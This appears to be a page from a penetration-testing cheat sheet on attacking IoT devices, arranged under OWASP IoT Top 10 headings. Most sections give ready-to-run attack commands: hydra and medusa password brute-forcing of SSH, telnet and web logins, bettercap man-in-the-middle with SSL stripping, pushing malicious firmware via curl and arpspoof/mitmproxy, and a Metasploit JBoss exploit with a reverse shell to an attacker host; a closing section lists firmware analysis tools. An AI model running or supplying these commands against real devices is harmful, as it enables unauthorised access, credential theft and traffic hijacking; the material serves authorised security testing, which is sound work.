---
title: IOT
sidebar: mydoc_sidebar
permalink: iot.html
folder: mydoc
---


## Weak Guessable, or Hardcoded Passwords

```
hydra -L usernames.txt -P passwords.txt ssh://192.168.0.1
```

or

```
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h 192.168.0.1 -M ssh
```

## Insecure Network Services


```
hydra -L userlist.txt -P passlist.txt -e ns -t 16 telnet://target_IP
```


## Insecure Ecosystem Interfaces


This command instructs Bettercap to start intercepting traffic between two devices with IP addresses 192.168.0.10 and 192.168.0.20, and to perform a TCP proxy for HTTP and HTTPS traffic. The -X option enables SSL stripping, which downgrades HTTPS connections to HTTP, making the traffic vulnerable to interception and manipulation.


```
sudo bettercap --proxy --sniffer -T 192.168.0.10,192.168.0.20 -X --tcp-proxy
```


## Lack of Secure Update Mechanism

Exploiting Unauthenticated Firmware Updates:

```
curl -F "file=@malicious_firmware.bin" http://target_device/update
```

Man-in-the-Middle Attack:

```
arpspoof -i eth0 -t target_device_ip gateway_ip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
mitmproxy -p 8080 -T --anticache -s "replace.py malicious_firmware.bin"
```

Fuzzing the Update Mechanism:

```
python3 firmware_fuzzer.py target_device_ip
```


## Use of Insecure or Outdated Components


This command uses the "http_jboss_jmx_invoke" module in Metasploit to scan for a vulnerable JBoss server running on port 8080 of the target device. If the vulnerability is found, the "java/jsp_shell_reverse_tcp" payload is used to establish a reverse shell connection back to the attacker's machine.



```
use auxiliary/scanner/http/http_jboss_jmx_invoke
set RHOSTS <target IP>
set RPORT 8080
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```


## Insufficient Privacy Protection


This command captures all network traffic on the device's wireless interface (wlan0) and saves it to a file called capture.pcap. The attacker can then use Wireshark or another network analysis tool to examine the captured traffic for sensitive information, such as login credentials or personal data.



```
sudo tcpdump -i wlan0 -s 0 -w capture.pcap
```

or


This command launches BetterCAP on the device's wireless interface (wlan0) and enables the proxy module, which allows the attacker to intercept and modify network traffic in real-time. The attacker can then use this to capture sensitive information or inject malicious payloads into the network traffic.


```
sudo bettercap -I wlan0 --proxy
```

## Insecure Data Transfer and Storage


In this command, mitmproxy is a popular tool for performing MITM attacks. The --host option tells mitmproxy to intercept traffic to and from the target device, and the -R option specifies the URL of the device's API endpoint. The --ssl-insecure option disables SSL certificate verification, allowing the attacker to intercept encrypted traffic.

The -s option specifies a custom script, extract_sensitive_data.py, that extracts sensitive data from intercepted traffic. This script could use regular expressions or other techniques to search for and extract sensitive data from intercepted requests and responses.

```
mitmproxy -T --host -R https://target_device.com/ --ssl-insecure -s extract_sensitive_data.py
```




## Insecure Default Settings


```
hydra -l admin -P password_list.txt 192.168.1.1 http-post-form "/login.html:user=admin&password=^PASS^:Incorrect password"

```


## Firmware Analysis

```
file <bin>  
strings  
strings -n5 <bin> 
strings -n16 <bin>#longer than 16
strings -tx <bin> #print offsets in hex 
binwalk <bin>  
hexdump -C -n 512 <bin> > hexdump.out  
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

If the binary may be encrypted, check the entropy using binwalk with the following command:


```
binwalk -E <bin>
```

Use the following tools and methods to extract filesystem contents:

```
$ binwalk -ev <bin>
```

Firmware Analysis Comparison Toolkit (FACT )

EmbedOS - Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools. The virtual machine can be downloaded and imported as an OVF file into VirtualBox or VMWare.
https://github.com/scriptingxss/EmbedOS



EMBA - Embedded Analyzer

```
sudo ./emba.sh -f ~/IoTGoat-x86.img.gz -l ~/emba_logs_iotgoat -p ./scan-profiles/default-scan.emba
```


firmware analysis toolkit

```
sudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0 
```




## resources

-	https://github.com/ahmedalroky/IOT-hacking-Roadmap
-	https://github.com/fkie-cad/awesome-embedded-and-iot-security
-	https://github.com/CyberSecurityUP/Awesome-Hardware-and-IoT-Hacking
-	https://github.com/nutc4k3/amazing-iot-security
-	https://github.com/ahmedalroky/IOT-hacking-Roadmap
-	https://owasp.org/www-chapter-pune/meetups/2019/August/IoT_Device_Pentest_by_Shubham_Chougule.pdf
-	https://github.com/scriptingxss/owasp-fstm




{% include links.html %}
